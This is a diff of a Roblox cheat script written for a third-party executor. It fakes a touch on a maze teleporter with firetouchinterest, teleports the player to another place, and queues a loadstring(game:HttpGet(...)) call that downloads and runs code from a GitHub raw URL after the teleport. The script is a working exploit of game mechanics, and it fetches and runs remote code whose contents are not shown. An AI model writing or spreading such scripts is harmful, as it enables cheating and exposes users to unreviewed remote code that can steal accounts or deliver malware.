@@ -1,36 +1,40 @@
 repeat task.wait() until game:IsLoaded()
-repeat task.wait() until game.Players.LocalPlayer
 
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
+
+while Players.LocalPlayer == nil do
+    task.wait()
+end
 
 local player = Players.LocalPlayer
-repeat task.wait() until player.Character
+
+if not player.Character then
+    player.CharacterAdded:Wait()
+end
 
 local char = player.Character
-repeat task.wait() until char:FindFirstChild("HumanoidRootPart")
 
-local root = char:FindFirstChild("HumanoidRootPart")
-
-local teleporter = workspace
-    .Map
-    .Walls
-    .SpinningMaze
-    .WebhookExit
-    .Teleporter
-
-if typeof(root) == "Instance" and root:IsA("BasePart")
-and typeof(teleporter) == "Instance" and teleporter:IsA("BasePart") then
-    task.wait(0.1)
-    firetouchinterest(root, teleporter, 0)
-    task.wait(0.1)
-    firetouchinterest(root, teleporter, 1)
-else
-    warn("Touch skipped because one of the objects isn't a BasePart")
+local root
+while true do
+    root = char:FindFirstChild("HumanoidRootPart")
+    if root then break end
+    task.wait()
 end
+
+local teleporter
+while true do
+    teleporter = workspace:FindFirstChild("Map", true)
+        and workspace.Map.Walls.SpinningMaze.WebhookExit:FindFirstChild("Teleporter")
+    if teleporter then break end
+    task.wait()
+end
+
+firetouchinterest(root, teleporter, 0)
+task.wait(0.1)
+firetouchinterest(root, teleporter, 1)
 
 queue_on_teleport([[
     loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneVIOLET/modeplace-webhook1/refs/heads/main/something"))()
 ]])
 
-TeleportService:Teleport(138009838341810, player)
+game:GetService("TeleportService"):Teleport(138009838341810, player)
